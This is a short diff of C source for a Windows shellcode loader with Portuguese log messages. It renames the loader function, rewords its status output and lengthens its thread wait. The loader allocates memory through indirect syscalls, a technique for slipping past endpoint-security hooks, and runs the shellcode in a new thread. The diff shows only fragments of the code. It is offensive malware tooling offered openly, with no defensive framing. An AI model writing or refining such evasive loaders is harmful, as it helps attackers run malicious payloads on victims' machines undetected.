@@ -1,7 +1,7 @@
 #include "syscalls.h"
 #include <stdio.h>
 
-void ExecuteShellcode(PBYTE shellcode, SIZE_T size) {
+void ExecuteShellcodeAdvanced(PBYTE shellcode, SIZE_T size) {
     HANDLE hProcess = GetCurrentProcess();
     PVOID baseAddr = NULL;
     SIZE_T regionSize = size;
@@ -10,7 +10,7 @@ void ExecuteShellcode(PBYTE shellcode, SIZE_T size) {
                                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (!NT_SUCCESS(status)) {
-        printf("[-] NtAllocateVirtualMemory falhou\n");
+        printf("[-] Falha na alocação de memória\n");
         return;
     }
 
@@ -24,7 +24,7 @@ void ExecuteShellcode(PBYTE shellcode, SIZE_T size) {
                               baseAddr, NULL, FALSE, 0, 0, 0, NULL);
 
     if (hThread) {
-        printf("[+] Shellcode executado via indirect syscall!\n");
-        WaitForSingleObject(hThread, 5000);
+        printf("[+] Shellcode injetado e executado via indirect syscalls!\n");
+        WaitForSingleObject(hThread, 8000);
     }
 }
